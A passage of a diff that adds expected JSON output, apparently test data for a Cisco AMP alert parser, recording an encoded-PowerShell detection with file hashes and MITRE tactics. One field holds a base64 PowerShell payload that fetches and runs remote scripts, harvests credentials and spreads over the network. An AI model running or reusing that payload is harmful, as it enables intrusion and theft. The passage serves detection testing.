+                    "cmd_line": "powershell.exe -NoP -NonI -W Hidden -E JABzAGUAPQBAACgAJwB1AHAAZABhAHQAZQAuAHcAaQBuAGQAbwB3AHMAZABlAGYAZQBuAGQAZQByAGgAbwBzAHQALgBjAGwAdQBiACcALAAnAGkAbgBmAG8ALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnACwAJwA4ADcALgAxADIAMQAuADkAOAAuADIAMQA1ACcAKQANAAoAJABuAGkAYwA9ACcAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnAA0ACgBmAG8AcgBlAGEAYwBoACgAJAB0ACAAaQBuACAAJABzAGUAKQANAAoAewANAAoAIAAgACAAIAAkAHAAaQBuAD0AdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAHQADQAKACAAIAAgACAAaQBmACAAKAAkAHAAaQBuACAALQBuAGUAIAAkAG4AdQBsAGwAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABuAGkAYwA9ACQAdAANAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAkAG4AaQBjAD0AJABuAGkAYwArACIAOgA4ADAAMAAwACIADQAKACQAdgBlAHIAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAHYAZQByAC4AdAB4AHQAIgApAC4AVAByAGkAbQAoACkAIAANAAoAaQBmACgAJAB2AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAewAgAA0ACgAgACAAIAAgAGkAZgAoACQAdgBlAHIAIAAtAG4AZQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAdgBlAHIAJwBdAC4AVgBhAGwAdQBlACkAewAgAA0ACgAgACAAIAAgACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAGkAbgBmAG8ANgAuAHAAcwAxACIAKQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAADQAKACAAIAAgACAAfQAgAA0ACgB9AA0ACgAkAHMAdABpAG0AZQA9AFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AA0ACgAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgACAAIAAgACAAIAAgACAADQAKACQAZABlAGYAdQBuAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABmAHUAbgBzACkAKQANAAoAaQBlAHgAIAAkAGQAZQBmAHUAbgANAAoADQAKAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4AZgBpAGwAdABlAHIAIAAtAG4AbwB0AG0AYQB0AGMAaAAgACcAUwB5AHMAdABlAG0AIABFAHYAZQBuAHQAcwAgAEwAbwBnACcAfQAgAHwAUgBlAG0AbwB2AGUALQBXAG0AaQBPAGIAagBlAGMAdAANAAoAJABkAGkAcgBwAGEAdABoAD0AJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAKwAnAFwAcwB5AHMAdABlAG0AMwAyACcAIAAgACAADQAKAGkAZgAgACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAkAGQAaQByAHAAYQB0AGgAIAApACkAewANAAoACQAkAGQAaQByAHAAYQB0AGgAPQAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAANAAoAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgANAAoAewBzAGUAbgB0AGYAaQBsAGUAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAIAAnAHYAYwBwACcAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHIAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgB7AHMAZQBuAHQAZgBpAGwAZQAgACgAJABkAGkAcgBwAGEAdABoACsAJwBcAG0AcwB2AGMAcgAxADIAMAAuAGQAbABsACcAKQAgACcAdgBjAHIAJwB9AA0ACgANAAoAWwBhAHIAcgBhAHkAXQAkAHAAcwBpAGQAcwA9ACAAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHwAcwBvAHIAdAAgAGMAcAB1ACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAGkAZAB9AA0ACgAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKACQAZQB4AGkAcwB0AD0AJABGAGEAbABzAGUADQAKAGkAZgAgACgAJABwAHMAaQBkAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgACkADQAKAHsADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGwAaQBuAGUAIAAtAGUAcQAgACQAbgB1AGwAbAApAA0ACgAgACAAIAAgACAAIAAgACAAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAHAAcwBpAGQAcwBbADAAXQAgAC0AZQBxACAAJABsAGkAbgBlAFsALQAxAF0AKQAgAC0AYQBuAGQAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiAEUAUwBUAEEAQgBMAEkAUwBIAEUARAAiACkAIAAtAGEAbgBkACAAKAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAOAAwACAAIgApACAALQBvAHIAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQANAA0ACIAKQApACAAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQB4AGkAcwB0AD0AJAB0AHIAdQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKAEsAaQBsAGwAQgBvAHQAKAAnAGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkADQAKAGYAbwByAGUAYQBjAGgAIAAoACQAdAAgAGkAbgAgACQAdABjAHAAYwBvAG4AbgApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAaQBuAGUAIAA9ACQAdAAuAHMAcABsAGkAdAAoACcAIAAnACkAfAAgAD8AewAkAF8AfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQAoACQAbABpAG4AZQAgAC0AaQBzACAAWwBhAHIAcgBhAHkAXQApACkAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAGwAaQBuAGUAWwAtADMAXQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAJAB0AC4AYwBvAG4AdABhAGkAbgBzACgAIgBFAFMAVABBAEIATABJAFMASABFAEQAIgApACAALQBhAG4AZAAgACgAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQAxADEAMQAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADIAMgAyADIAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgAzADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA0ADQANAAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADUANQA1ADUAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA2ADYANgA2ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANwA3ADcANwAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADgAOAA4ADgAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA5ADkAOQA5ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA1ADUANgAwACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANgA1ADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANQA1ADMAMwA1ACIAKQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAdgBpAGQAPQAkAGwAaQBuAGUAWwAtADEAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAGUAdgBpAGQAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMAIAAtAGYAbwByAGMAZQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAaQBmACAAKAAhACQAZQB4AGkAcwB0ACAALQBhAG4AZAAgACgAJABwAHMAaQBkAHMALgBjAG8AdQBuAHQAIAAtAGwAZQAgADgAKQApAA0ACgB7ACAAIAAgAA0ACgAgACAAIAAgACQAYwBtAGQAbQBvAG4APQAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBXACAASABpAGQAZABlAG4AIABgACIAYAAkAG0AbwBuACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAbQBvAG4AJwBdAC4AVgBhAGwAdQBlADsAYAAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgADsAaQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAGAAJABmAHUAbgBzACkAKQApADsASQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAGAAJABSAGUAbQBvAHQAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoAGAAJABtAG8AbgAsACAAYAAkAG0AbwBuACwAIAAnAFYAbwBpAGQAJwAsACAAMAAsACAAJwAnACwAIAAnACcAKQBgACIAIgANAAoAIAAgACAAIAAkAHYAYgBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAANAAoACQAkAHYAYgBzAC4AcgB1AG4AKAAkAGMAbQBkAG0AbwBuACwAMAApACAAIAANAAoAfQANAAoADQAKACQATgBUAEwATQA9ACQARgBhAGwAcwBlAA0ACgAkAG0AaQBtAGkAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBtAGkAbQBpACcAXQAuAFYAYQBsAHUAZQAgAA0ACgAkAGEALAAgACQATgBUAEwATQA9ACAARwBlAHQALQBjAHIAZQBkAHMAIAAkAG0AaQBtAGkAIAAkAG0AaQBtAGkADQAKACAAIAAgACAAIAAgACAADQAKACQATgBlAHQAdwBvAHIAawBzACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABXAGkAbgAzADIAXwBOAGUAdAB3AG8AcgBrAEEAZABhAHAAdABlAHIAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAC0ARQBBACAAUwB0AG8AcAAgAHwAIAA/ACAAewAkAF8ALgBJAFAARQBuAGEAYgBsAGUAZAB9ACAAIAAgACAADQAKACQAaQBwAHMAdQAgAD0AIAAoAFsAVwBtAGkAQwBsAGEAcwBzAF0AIAAnAHIAbwBvAHQAXABkAGUAZgBhAHUAbAB0ADoAYwBvAHIAZQBkAHAAdQBzAHMAdgByACcAKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAnAGkAcABzAHUAJwBdAC4AVgBhAGwAdQBlACAADQAKACQAaQAxADcAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBpADEANwAnAF0ALgBWAGEAbAB1AGUADQAKACQAcwBjAGIAYQA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBzAGMAJwBdAC4AVgBhAGwAdQBlAA0ACgBbAGIAeQB0AGUAWwBdAF0AJABzAGMAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABzAGMAYgBhACkAIAAgACAAIAAgAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAE4AZQB0AHcAbwByAGsAIABpAG4AIAAkAE4AZQB0AHcAbwByAGsAcwApACAADQAKAHsAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAADQAKACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACAAPQAgACQATgBlAHQAdwBvAHIAawAuAEkAcABBAGQAZAByAGUAcwBzAFsAMABdACAAIAANAAoACQBpAGYAIAAoACQASQBQAEEAZABkAHIAZQBzAHMAIAAtAG0AYQB0AGMAaAAgACcAXgAxADYAOQAuADIANQA0ACcAKQB7AGMAbwBuAHQAaQBuAHUAZQB9ACAACQANAAoAIAAgACAAIAAkAFMAdQBiAG4AZQB0AE0AYQBzAGsAIAAgAD0AIAAkAE4AZQB0AHcAbwByAGsALgBJAFAAUwB1AGIAbgBlAHQAWwAwAF0AIAAgAA0ACgAgACAAIAAgACQAaQBwAHMAPQBHAGUAdAAtAE4AZQB0AHcAbwByAGsAUgBhAG4AZwBlACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACQAUwB1AGIAbgBlAHQATQBhAHMAawANAAoACQAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKAAkAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhACgAJABsAGkAbgBlACAALQBpAHMAIABbAGEAcgByAGEAeQBdACkAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAaQBmACAAKAAkAGwAaQBuAGUALgBjAG8AdQBuAHQAIAAtAGwAZQAgADQAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAJABpAD0AJABsAGkAbgBlAFsALQAzAF0ALgBzAHAAbABpAHQAKAAnADoAJwApAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAgACgAJABsAGkAbgBlAFsALQAyAF0AIAAtAGUAcQAgACcARQBTAFQAQQBCAEwASQBTAEgARQBEACcAKQAgAC0AYQBuAGQAIAAgACgAJABpACAALQBuAGUAIAAnADEAMgA3AC4AMAAuADAALgAxACcAKQAgAC0AYQBuAGQAIAAoACQAaQBwAHMAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcABzACsAPQAkAGkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAaQBmACAAKAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AC0AJABzAHQAaQBtAGUAKQAvADEAMAAwADAAIAAtAGcAdAAgADUANAAwADAAKQB7AGIAcgBlAGEAawB9AA0ACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAaQBwACAAaQBuACAAJABpAHAAcwApAA0ACgAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVABpAGMAawBDAG8AdQBuAHQALQAkAHMAdABpAG0AZQApAC8AMQAwADAAMAAgAC0AZwB0ACAANQA0ADAAMAApAHsAYgByAGUAYQBrAH0ADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQBwACAALQBlAHEAIAAkAEkAUABBAGQAZAByAGUAcwBzACkAewBjAG8AbgB0AGkAbgB1AGUAfQAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAGkAcAAgAC0AYwBvAHUAbgB0ACAAMQApACAALQBuAGUAIAAkAG4AdQBsAGwAIAAgAC0AYQBuAGQAIAAkAGkAcABzAHUAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQBwACkAIAANAAoAIAAgACAAIAAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAD0AMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGEALgBjAG8AdQBuAHQAIAAtAG4AZQAgADAAKQAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAkAHIAZQAgAD0AIAB0AGUAcwB0AC0AaQBwACAALQBpAHAAIAAkAGkAcAAgAC0AYwByAGUAZABzACAAJABhACAAIAAtAG4AaQBjACAAJABuAGkAYwAgAC0AbgB0AGwAbQAgACQATgBUAEwATQAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJAByAGUAIAAtAGUAcQAgADEAKQB7ACQAaQBwAHMAdQAgAD0AJABpAHAAcwB1ACAAKwAiACAAIgArACQAaQBwAH0ADQAKAAkACQAJAGUAbABzAGUADQAKAAkACQAJAHsADQAKAAkACQAJAAkAJAB2AHUAbAA9AFsAUABpAG4AZwBDAGEAcwB0AGwAZQAuAFMAYwBhAG4AbgBlAHIAcwAuAG0AMQA3AHMAYwBdADoAOgBTAGMAYQBuACgAJABpAHAAKQAJAAkACQAJAA0ACgAJAAkACQAJAGkAZgAgACgAJAB2AHUAbAAgAC0AYQBuAGQAIAAkAGkAMQA3ACAALQBuAG8AdABjAG8AbgB0AGEAaQBuAHMAIAAkAGkAcAApAA0ACgANAAoACQAJAAkACQB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwA9AGUAYgA3ACAAJABpAHAAIAAkAHMAYwANAAoACQAJAAkACQAJAGkAZgAgACgAIQAoACQAcgBlAHMAIAAtAGUAcQAgACQAdAByAHUAZQApACkADQAKAAkACQAJAAkACQB7AGUAYgA4ACAAJABpAHAAIAAkAHMAYwB9AA0ACgAJAAkACQAJAAkAJABpADEANwAgAD0AIAAkAGkAMQA3ACAAKwAgACIAIAAiACsAJABpAHAADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAIAB9ACAAIAAgACAAIAAgACAADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApACAAIAANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpAHAAcwB1ACcAIAAsACQAaQBwAHMAdQApAA0ACgAkAFMAdABhAHQAaQBjAEMAbABhAHMAcwAuAFAAdQB0ACgAKQANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpADEANwAnACAALAAkAGkAMQA3ACkADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAC4AUAB1AHQAKAApAA==",
+                    "parent_app": "WmiPrvSE.exe",
+                    "parent_app_path": "C:\\Windows\\System32\\wbem",
+                    "parent_pid": 2236,
+                    "parent_puid": 132461352663910600,
+                    "parent_user": "SYSTEM",
+                    "parent_user_sid": "010100000000000512000000",
+                    "pid": 10724,
+                    "puid": 132465072105597400,
+                    "ts": 1602033881727175700,
+                    "user": "user@testdomain.com",
+                    "user_sid": "010100000000000512000000"
+                }
+            }
+        ],
+        "cisco.amp.bp_data.details.matched_activity.limited": false,
+        "cisco.amp.bp_data.details.matched_activity.matched": 1,
+        "cisco.amp.bp_data.details.schema": "endpoint",
+        "cisco.amp.bp_data.details.schema_epoch": 2,
+        "cisco.amp.bp_data.details.sig_id": 20190517123456,
+        "cisco.amp.bp_data.details.sig_rev": 5,
+        "cisco.amp.bp_data.detection": "apde:20190517123456",
+        "cisco.amp.bp_data.end_ts": 1610640884,
+        "cisco.amp.bp_data.engine": "apde",
+        "cisco.amp.bp_data.id": "d2616Ab846",
+        "cisco.amp.bp_data.name": "WMIPRVSE Launched Encoded Powershell Command",
+        "cisco.amp.bp_data.normalized.name": "wmiprvse launched encoded powershell command",
+        "cisco.amp.bp_data.normalized.observables.file.name": [
+            "powershell.exe",
+            "wmiprvse.exe"
+        ],
+        "cisco.amp.bp_data.normalized.observables.file.path": [
+            "c:\\windows\\system32\\windowspowershell\\v1.0",
+            "c:\\windows\\system32\\wbem"
+        ],
+        "cisco.amp.bp_data.observables.file": [
+            {
+                "md5": "a575a7610e5f003cc36df39e07c4ba7d",
+                "name": "powershell.exe",
+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "properties": {
+                    "copyright": "\u00a9 Microsoft Corporation. All rights reserved.",
+                    "file_version": "10.0.14409.1005",
+                    "product": "Microsoft\u00ae Windows\u00ae Operating System",
+                    "product_version": "10.0.14409.1005"
+                },
+                "sha1": "88e7cdc0b75364418e11b2c53f772085f1b61d1e",
+                "sha256": "006cef6ef6488721895d93e4cef7fa0709c2692d74bde1e22e2a8719b2a86218",
+                "size": 443392,
+                "type_id": 1
+            },
+            {
+                "md5": "d683c112190f4b4c6d477d693ee88e35",
+                "name": "WmiPrvSE.exe",
+                "path": "C:\\Windows\\System32\\wbem",
+                "properties": {
+                    "copyright": "\u00a9 Microsoft Corporation. All rights reserved.",
+                    "file_version": "10.0.14409.1005",
+                    "product": "Microsoft\u00ae Windows\u00ae Operating System",
+                    "product_version": "10.0.14409.1005"
+                },
+                "sha1": "67858ead93feed62c0b1865369840e6e8086f53b",
+                "sha256": "385892542cc5a996488262b193061feac4615d66657157c3d4a76251911da334",
+                "size": 425984,
+                "type_id": 1
+            }
+        ],
+        "cisco.amp.bp_data.remediated": false,
+        "cisco.amp.bp_data.severity": "medium",
+        "cisco.amp.bp_data.silent": false,
+        "cisco.amp.bp_data.start_ts": 1610640884,
+        "cisco.amp.bp_data.tactics": [
+            "TA0002",
+            "TA0005",
+            "TA0008"
+        ],
+        "cisco.amp.bp_data.ts": 1610640884,
+        "cisco.amp.bp_data.type": "activity",
+        "cisco.amp.computer.active": true,
+        "cisco.amp.computer.connector_guid": "test_connector_guid",
+        "cisco.amp.computer.external_ip": "8.8.8.8",
+        "cisco.amp.computer.network_addresses": [
+            {
+                "ip": "10.10.10.10",
+                "mac": "be:b0:d5:89:e2:96"
+            }
+        ],
+        "cisco.amp.connector_guid": "test_connector_guid",
+        "cisco.amp.detection": "WMIPRVSE Launched Encoded Powershell Command",
+        "cisco.amp.event_type_id": 553648222,
+        "cisco.amp.group_guids": [
+            "test_group_guid"
+        ],
+        "cisco.amp.mitre_tactics": [
+            "TA0002",
+            "TA0005",
+            "TA0008"
+        ],
+        "cisco.amp.related.mac": [
+            "be:b0:d5:89:e2:96"
+        ],
+        "cisco.amp.timestamp_nanoseconds": 810000000,
+        "event.action": "Threat Detection",
+        "event.dataset": "cisco.amp",
+        "event.id": 6880683125978957000,
+        "event.kind": "alert",
+        "event.module": "cisco",
+        "event.severity": 2,
+        "fileset.name": "amp",
+        "host.hostname": "Demo_BP_WMIPRVSE",
+        "host.name": "Demo_BP_WMIPRVSE",
+        "input.type": "log",
+        "log.offset": 43992,
+        "related.hosts": [
+            "Demo_BP_WMIPRVSE"
+        ],
+        "related.ip": [
+            "8.8.8.8",
+            "10.10.10.10"
+        ],
+        "service.type": "cisco",
+        "tags": [
+            "cisco-amp",
+            "forwarded"
+        ]
+    },
+    {
+        "@timestamp": "2021-01-14T16:14:44.000Z",
+        "cisco.amp.bp_data.audit": false,
+        "cisco.amp.bp_data.details.actions": [],
+        "cisco.amp.bp_data.details.eng_epoch": 1,
+        "cisco.amp.bp_data.details.eng_ver": "0.9.0.104",
+        "cisco.amp.bp_data.details.matched_activity.events": [
+            {
+                "process:start": {
+                    "app": "powershell.exe",
+                    "app_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                    "args": [
